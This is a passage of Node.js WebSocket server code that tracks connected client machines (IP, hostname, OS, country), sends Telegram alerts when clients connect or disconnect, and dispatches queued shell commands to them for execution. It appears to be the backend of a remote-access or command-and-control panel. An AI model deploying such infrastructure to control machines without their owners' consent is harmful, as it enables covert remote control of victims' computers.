            // Find the client by UUID and update its details, or create it if it doesn't exist.
            let updatedClient = await Client.findOne({ uuid: data.uuid });
            
            if (updatedClient) {
                // Update existing client with enhanced platform information
                updatedClient.ip = data.ip || data.ipAddress || 'Unknown';
                updatedClient.ipAddress = data.ipAddress || data.ip || 'Unknown';
                updatedClient.computerName = data.computerName || data.hostname || 'Unknown';
                updatedClient.hostname = data.hostname || 'Unknown';
                updatedClient.platform = data.platform || 'Unknown';
                updatedClient.operatingSystem = operatingSystem;
                updatedClient.osVersion = data.osVersion || data.version || 'Unknown';
                updatedClient.architecture = architecture;
                updatedClient.capabilities = capabilities;
                updatedClient.country = data.country || 'Unknown';
                updatedClient.lastSeen = new Date();
                updatedClient.lastActiveTime = new Date();
                updatedClient.lastHeartbeat = new Date();
                updatedClient.status = 'online';
                updatedClient.connectionCount = (updatedClient.connectionCount || 0) + 1;
                
                // Update system information if provided
                if (data.systemInfo) {
                    updatedClient.systemInfo = {
                        ...updatedClient.systemInfo,
                        ...data.systemInfo
                    };
                }
                
                await updatedClient.save();
            } else {
                // Create new client with enhanced platform information
                updatedClient = new Client({
                    uuid: data.uuid,
                    ip: data.ip || data.ipAddress || 'Unknown',
                    ipAddress: data.ipAddress || data.ip || 'Unknown',
                    computerName: data.computerName || data.hostname || 'Unknown',
                    hostname: data.hostname || 'Unknown',
                    platform: data.platform || 'Unknown',
                    operatingSystem: operatingSystem,
                    osVersion: data.osVersion || data.version || 'Unknown',
                    architecture: architecture,
                    capabilities: capabilities,
                    country: data.country || 'Unknown',
                    lastSeen: new Date(),
                    lastActiveTime: new Date(),
                    lastHeartbeat: new Date(),
                    status: 'online',
                    connectionCount: 1,
                    systemInfo: data.systemInfo || {}
                });
                await updatedClient.save();
                
                // Send Telegram notification for new connection
                try {
                    await telegramService.notifyNewConnection(updatedClient);
                } catch (telegramError) {
                    console.error('Failed to send Telegram notification:', telegramError);
                }
            }

            // Broadcast client status update to all admin sessions
            const { webPanelIntegration } = require('./integration');
            const formattedClient = webPanelIntegration.formatClientForWebPanel(updatedClient);
            broadcastToAdminSessions({
                type: 'client_status_update',
                client: formattedClient
            });

            // Check for any pending tasks for this client
            const tasks = await Task.find({ uuid: data.uuid, status: 'pending' });
            for (const task of tasks) {
                // Validate command compatibility before sending
                const isCompatible = validateCommandCompatibility(task.command, operatingSystem, capabilities);
                
                if (isCompatible) {
                    ws.send(JSON.stringify({ 
                        type: 'execute',        // C# client expects this
                        cmd: 'execute',         // Qt client expects this  
                        command: task.command,  // All clients expect this
                        taskId: task._id        // All clients expect this
                    }));
                    task.status = 'executed';
                    await task.save();
                    
                    // Broadcast task execution to admin sessions
                    broadcastToAdminSessions({
                        type: 'task_executed',
                        taskId: task._id,
                        clientUuid: data.uuid,
                        command: task.command
                    });
                } else {
                    // Mark task as failed due to incompatibility
                    task.status = 'failed';
                    task.output = `Command not compatible with ${operatingSystem} platform`;
                    await task.save();
                    
                    broadcastToWebClients({
                        type: 'task_failed',
                        taskId: task._id,
                        clientUuid: data.uuid,
                        reason: 'Platform incompatibility'
                    });
                }
            }

        } catch (err) {
            console.error('WebSocket message processing error:', err);
        }
    });

    ws.on('close', async () => {
        console.log('Client disconnected');
        console.log('Connection stats before cleanup:', getConnectionStats());
        
        if (ws.clientType === 'admin') {
            adminSessions.delete(ws);
            console.log('Admin session disconnected. Total admin sessions:', adminSessions.size);
        } else if (ws.uuid && ws.clientType === 'client') {
            connectedClients.delete(ws.uuid);
            console.log('Client disconnected:', ws.uuid);
            
            const updatedClient = await Client.findOneAndUpdate(
                { uuid: ws.uuid },
                { 
                    $set: { 
                        status: 'offline',
                        lastSeen: new Date()
                    }
                },
                { new: true }
            );
            
            if (updatedClient) {
                // Broadcast client status update to admin sessions
                const { webPanelIntegration } = require('./integration');
                const formattedClient = webPanelIntegration.formatClientForWebPanel(updatedClient);
                broadcastToAdminSessions({
                    type: 'client_status_update',
                    client: formattedClient
                });

                // Send Telegram notification for client disconnection
                try {
                    if (telegramService.isEnabled() && telegramService.getConfig().notifications.disconnection) {
                        const clientInfo = {
                            uuid: ws.uuid,
                            computerName: updatedClient.computerName || 'Unknown',
                            ipAddress: updatedClient.ipAddress || 'Unknown',
                            platform: updatedClient.platform || 'Unknown'
                        };
                        await telegramService.sendDisconnectionNotification(clientInfo);
                    }
                } catch (telegramError) {
                    console.error('[TELEGRAM] Error sending disconnection notification:', telegramError);
                }
            }
        }
        
        console.log('Updated connection stats after cleanup:', getConnectionStats());
        clearTimeout(authTimeout);
    });

    ws.on('error', (error) => {
        console.error('WebSocket error on connection:', error);
    });
};

// Command compatibility validation
function validateCommandCompatibility(command, operatingSystem, capabilities) {
    // Basic platform-specific command validation
    const windowsCommands = ['powershell', 'cmd', 'wmic', 'reg ', 'net ', 'sc '];
    const linuxCommands = ['bash', 'sh', 'ps ', 'kill ', 'grep ', 'find ', 'ls '];
    const macosCommands = ['bash', 'zsh', 'osascript', 'defaults', 'launchctl'];
    
    const commandLower = command.toLowerCase();
    
    switch (operatingSystem) {
        case 'windows':
            return windowsCommands.some(cmd => commandLower.includes(cmd)) || 
                   capabilities.commands.some(cap => commandLower.includes(cap));
        case 'linux':
            return linuxCommands.some(cmd => commandLower.includes(cmd)) || 
                   capabilities.commands.some(cap => commandLower.includes(cap));
        case 'macos':
            return macosCommands.some(cmd => commandLower.includes(cmd)) || 
                   capabilities.commands.some(cap => commandLower.includes(cap));
        default:
            // For unknown platforms, allow basic commands
            return capabilities.commands.includes('basic_shell') || 
                   ['echo', 'whoami', 'pwd'].some(cmd => commandLower.includes(cmd));
    }
}

// Export all functions and the main handler
module.exports = wsHandler;
module.exports.getClientConnection = getClientConnection;
module.exports.getConnectionStats = getConnectionStats;
module.exports.broadcastConnectionStats = broadcastConnectionStats;
module.exports.broadcastToAdminSessions = broadcastToAdminSessions;
module.exports.getConnectedClients = () => connectedClients;
